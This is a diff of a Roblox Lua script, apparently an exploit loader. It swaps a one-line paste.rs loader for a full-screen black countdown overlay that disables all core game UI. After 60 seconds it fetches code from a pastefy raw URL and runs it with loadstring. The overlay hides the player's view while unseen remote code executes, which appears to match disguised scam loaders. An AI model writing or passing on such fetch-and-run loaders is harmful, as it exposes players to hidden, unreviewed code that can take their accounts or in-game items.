@@ -1,1 +1,80 @@
-loadstring(game:HttpGet('https://paste.rs/RX7ON'))()
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local Player = Players.LocalPlayer
+
+repeat task.wait() until Player:FindFirstChild("PlayerGui")
+
+-- Disable default UI
+pcall(function()
+	for _, gui in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+		StarterGui:SetCoreGuiEnabled(gui, false)
+	end
+	StarterGui:SetCore("TopbarEnabled", false)
+end)
+
+-- Create GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "CountdownGui"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.DisplayOrder = 9999
+gui.Parent = Player:WaitForChild("PlayerGui")
+
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+
+-- Top message
+local topLabel = Instance.new("TextLabel", bg)
+topLabel.Size = UDim2.new(1, 0, 0.15, 0)
+topLabel.Position = UDim2.new(0, 0, 0.05, 0)
+topLabel.BackgroundTransparency = 1
+topLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+topLabel.Font = Enum.Font.Cartoon
+topLabel.TextScaled = true
+topLabel.Text = "Waiting to Load Script Patient"
+
+-- Countdown
+local text = Instance.new("TextLabel", bg)
+text.Size = UDim2.new(1, 0, 0.3, 0)
+text.Position = UDim2.new(0, 0, 0.35, 0)
+text.BackgroundTransparency = 1
+text.TextColor3 = Color3.new(1, 1, 1)
+text.Font = Enum.Font.GothamBlack
+text.TextScaled = true
+text.Text = "60s"
+
+-- Bottom credits
+local bottomLabel = Instance.new("TextLabel", bg)
+bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
+bottomLabel.Position = UDim2.new(0, 0, 0.85, 0)
+bottomLabel.BackgroundTransparency = 1
+bottomLabel.TextColor3 = Color3.fromRGB(0, 255, 127)
+bottomLabel.Font = Enum.Font.Cartoon
+bottomLabel.TextScaled = true
+bottomLabel.Text = "Credits to Tenshi!"
+
+-- Side message
+local sideLabel = Instance.new("TextLabel", bg)
+sideLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
+sideLabel.Position = UDim2.new(0.7, 0, 0.02, 0)
+sideLabel.BackgroundTransparency = 1
+sideLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+sideLabel.Font = Enum.Font.Cartoon
+sideLabel.TextScaled = true
+sideLabel.Text = "Be Patient if it's not loading or Stuck!"
+sideLabel.TextWrapped = true
+
+-- Countdown logic
+local t = 60
+task.spawn(function()
+	while t > 0 do
+		text.Text = tostring(t) .. "s"
+		task.wait(1)
+		t -= 1
+	end
+	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
+end)
